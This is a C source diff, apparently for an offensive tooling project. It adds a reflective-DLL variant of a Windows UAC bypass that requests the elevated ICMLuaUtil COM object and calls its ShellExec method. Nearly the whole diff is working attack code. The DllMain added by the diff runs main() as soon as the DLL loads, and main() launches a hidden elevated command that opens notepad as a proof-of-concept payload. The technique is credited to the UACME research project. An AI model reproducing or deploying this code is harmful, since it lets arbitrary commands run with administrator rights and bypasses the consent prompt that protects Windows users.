@@ -112,6 +112,8 @@ static void ucmAllocateElevatedObject(void **ppv) {
   CoGetObject(szMoniker, (BIND_OPTS *)&bop, &riid, ppv);
 }
 
+#if !rdi
+
 static char *convert(int *rawSize, const char *text) {
   int textSize = strlen(text);
   *rawSize = textSize / 2;
@@ -227,6 +229,39 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
   }
   return TRUE;
 }
+
+#else
+
+#include "./rdi/ReflectiveLoader.h"
+
+int main() {
+  CoInitialize(0);
+
+  ICMLuaUtil *CMLuaUtil;
+  ucmAllocateElevatedObject((void **)&CMLuaUtil);
+
+  CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, L"cmd", L"/c C:/Windows/notepad.exe", PWD, 0, SW_HIDE);
+
+  CMLuaUtil->lpVtbl->Release(CMLuaUtil);
+  CoUninitialize();
+  return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
+  switch (reason) {
+  case DLL_PROCESS_ATTACH:
+    GetCurrentDirectoryW(MAX_PATH, PWD);
+    main();
+    break;
+  case DLL_THREAD_ATTACH:
+  case DLL_THREAD_DETACH:
+  case DLL_PROCESS_DETACH:
+    break;
+  }
+  return TRUE;
+}
+
+#endif
 
 /*
 https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/methods/api0cradle.c
